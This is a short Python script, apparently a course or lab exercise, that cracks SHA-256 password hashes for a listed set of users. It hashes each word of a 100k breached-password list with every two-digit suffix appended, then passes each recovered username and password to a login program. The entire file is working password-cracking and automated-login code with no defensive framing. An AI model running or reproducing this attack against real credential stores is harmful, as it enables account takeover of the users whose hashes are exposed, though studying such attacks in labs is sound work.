import time, subprocess, hashlib

start = time.time()

hashed_dict = {}
for i in open("HashedPWs", "r"):
    name = i.strip()[0:i.strip().index(",")]
    pw = i.strip()[i.strip().index(",")+1:]
    if name not in hashed_dict: hashed_dict[name] = set()
    hashed_dict[name].add(pw)

for j in open("PwnedPWs100k", "r"):
    for i in open("gang", "r"):
        if i.strip() in hashed_dict:
            for k in range(0,10):
                for l in range(0,10):
                    sha256 = hashlib.sha256()
                    curr = j.strip() + str(k) + str(l)
                    sha256.update(bytes(curr, "utf-8"))
                    if sha256.hexdigest() in hashed_dict[i.strip()]:
                        subprocess.run(["python3", "Login.pyc", i.strip(), curr])
                        print("Name: " + i.strip() + ", Password: " + curr)
                        print("Time Elapsed: ", time.time()-start)
